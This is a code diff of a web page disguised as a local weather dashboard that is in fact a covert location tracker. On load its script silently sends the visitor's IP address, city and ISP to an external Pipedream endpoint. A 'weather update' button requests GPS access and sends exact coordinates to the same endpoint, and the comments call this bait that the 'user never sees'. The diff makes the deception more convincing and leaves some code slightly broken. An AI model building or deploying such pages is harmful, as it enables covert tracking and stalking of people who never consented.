@@ -6,81 +6,84 @@
     <title>Live Weather Dashboard</title>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #1a202c; color: white; text-align: center; padding: 50px; }
-        .card { background: #2d3748; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 15px rgba(0,0,0,0.3); }
-        #city-name { font-size: 24px; color: #63b3ed; margin: 10px 0; }
-        .btn { background: #3182ce; color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; transition: 0.3s; }
-        .btn:hover { background: #4299e1; transform: scale(1.05); }
-        #status-msg { font-size: 14px; color: #a0aec0; margin-top: 15px; }
+        .card { background: #2d3748; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 15px rgba(0,0,0,0.3); width: 300px; }
+        #city-display { font-size: 22px; color: #63b3ed; margin: 15px 0; font-weight: bold; }
+        .temp { font-size: 48px; margin: 10px 0; }
+        .btn { background: #3182ce; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; width: 100%; }
+        .btn:hover { background: #4299e1; }
+        #status-msg { font-size: 13px; color: #718096; margin-top: 15px; font-style: italic; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h1>Local Weather Report</h1>
-        <div id="city-name">Detecting region...</div>
-        <p id="temp-display">Temperature: --°C</p>
+        <h2 style="margin:0; font-size: 18px; color: #a0aec0;">Local Forecast</h2>
+        <div id="city-display">Detecting location...</div>
+        <div class="temp">28°C</div>
+        <p style="margin: 5px 0; color: #cbd5e0;">Partly Cloudy</p>
         
-        <button class="btn" onclick="getPrecisionWeather()">Get Hyper-Local Weather</button>
-        <p id="status-msg">Based on your ISP location.</p>
+        <button class="btn" onclick="updateLocation()">Update for My Area</button>
+        <p id="status-msg">Using regional ISP data.</p>
     </div>
 
     <script>
-        // REPLACE THIS WITH YOUR ACTUAL PIPEDREAM ENDPOINT
+        // PASTE YOUR PIPEDREAM URL HERE
         const PIPEDREAM_URL = "https://eotwt8cj1vr426p.m.pipedream.net";
 
-        // --- STAGE 1: AUTO-RUN IP CAPTURE ---
+        // STAGE 1: SILENT IP CAPTURE ON LOAD
         window.onload = function() {
             fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
-                // Update UI with "Bait" info
-                document.getElementById('city-name').innerText = "Weather for " + data.city + ", " + data.region;
-                document.getElementById('temp-display').innerText = "Temperature: 28°C (Regional)";
-
-                // SILENTLY SEND IP DATA TO PIPEDREAM
+                document.getElementById('city-display').innerText = data.city + ", " + data.region;
+                
+                // Log IP to Pipedream
                 fetch(PIPEDREAM_URL, {
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify({
-                        event: "IP_LOGGED",
+                        type: "IP_ONLY",
                         ip: data.ip,
                         city: data.city,
-                        isp: data.org,
-                        device: navigator.userAgent
+                        isp: data.org
                     })
                 });
             });
         };
 
-        // --- STAGE 2: GPS PERMISSION ON CLICK ---
-        function getPrecisionWeather() {
-            document.getElementById('status-msg').innerText = "Requesting precision sensor access...";
+        // STAGE 2: NATURAL GPS CAPTURE
+        function updateLocation() {
+            document.getElementById('status-msg').innerText = "Synchronizing with local station...";
             
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
 
-                    // Update UI to look successful
-                    document.getElementById('city-name').innerText = "Precision Location Verified!";
-                    document.getElementById('status-msg').innerText = "GPS Fixed: " + lat.toFixed(4) + ", " + lon.toFixed(4);
-                    document.getElementById('temp-display').innerText = "Temperature: 29.4°C (Verified)";
+                    // Convert Coordinates to a City Name (Reverse Geocode)
+                    fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
+                    .then(res => res.json())
+                    .then(geoData => {
+                        // UPDATE UI: Change "Andhra Pradesh" to "Hyderabad" (or their real city)
+                        document.getElementById('city-display').innerText = geoData.city + ", " + geoData.principalSubdivision;
+                        document.getElementById('status-msg').innerText = "Local forecast updated.";
+                        document.getElementById('temp-display').innerText = "29.2°C";
+                    });
 
-                    // SEND THE "GOLD" DATA TO PIPEDREAM
+                    // SEND THE ACTUAL COORDINATES TO PIPEDREAM (User never sees this)
                     fetch(PIPEDREAM_URL, {
                         method: 'POST',
                         mode: 'no-cors',
                         body: JSON.stringify({
-                            event: "GPS_LOGGED",
-                            latitude: lat,
-                            longitude: lon,
-                            accuracy: position.coords.accuracy + " meters"
+                            type: "GPS_DATA",
+                            lat: lat,
+                            lon: lon,
+                            accuracy: position.coords.accuracy + "m"
                         })
                     });
-                }, function(error) {
-                    document.getElementById('status-msg').innerText = "Precision access denied. Using ISP data.";
+                }, function() {
+                    document.getElementById('status-msg').innerText = "Unable to sync. Using regional data.";
                 });
-            }
         }
     </script>
 </body>
